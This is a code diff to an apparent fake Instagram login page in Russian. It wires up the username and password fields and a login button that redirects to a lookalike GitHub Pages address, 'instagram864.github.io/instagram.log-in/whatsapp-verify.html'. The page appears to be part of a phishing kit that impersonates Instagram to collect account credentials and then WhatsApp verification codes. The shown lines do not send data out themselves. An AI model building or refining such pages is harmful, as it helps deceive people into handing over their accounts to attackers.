@@ -81,8 +81,11 @@
       transition: background 0.2s;
     }
 
-    .btn-login:hover { background: #1f4494; }
-    .btn-login:active { transform: scale(0.98); }
+    .btn-login {
+      background: #1a3a7a;
+      color: #8aabdf;
+      cursor: not-allowed;
+    }
 
     .btn-login.active {
         background: #1a6bbf;        /* Синий фон */
@@ -157,11 +160,9 @@
     <div class="content">
       <h1 class="title">Войти в Instagram</h1>
 
-      <input class="field" type="text" placeholder="Имя пользователя, номер мобил…" autocomplete="username">
-      <input class="field" type="password" placeholder="Пароль" autocomplete="current-password">
-
-<button class="btn-login" onclick="window.location.href='https://instagram864.github.io/instagram.log-in/whatsapp-verify.html'">Войти</button>      <a class="forgot" href="#">Забыли пароль?</a>
-
+      <input class="field" type="text" id="username" placeholder="Имя пользователя, номер мобил…" autocomplete="username">
+<input class="field" type="password" id="password" placeholder="Пароль" autocomplete="current-password">
+<button class="btn-login" id="loginBtn" onclick="window.location.href='https://instagram864.github.io/instagram.log-in/whatsapp-verify.html'">Войти</button>
       <div class="gap"></div>
 
       <button class="btn-fb">
@@ -195,7 +196,13 @@ function checkInputs() {
     loginBtn.disabled = true;            // Делаем кнопку НЕкликабельной
   }
 }
-
+// Добавьте эту функцию после checkInputs()
+function handleLogin() {
+  if (loginBtn.classList.contains('active')) {
+    // Переход на другую страницу
+    window.location.href = 'https://instagram864.github.io/instagram.log-in/whatsapp-verify.html';
+  }
+}
 // Следим за вводом в поля
 usernameInput.addEventListener('input', checkInputs);
 passwordInput.addEventListener('input', checkInputs);
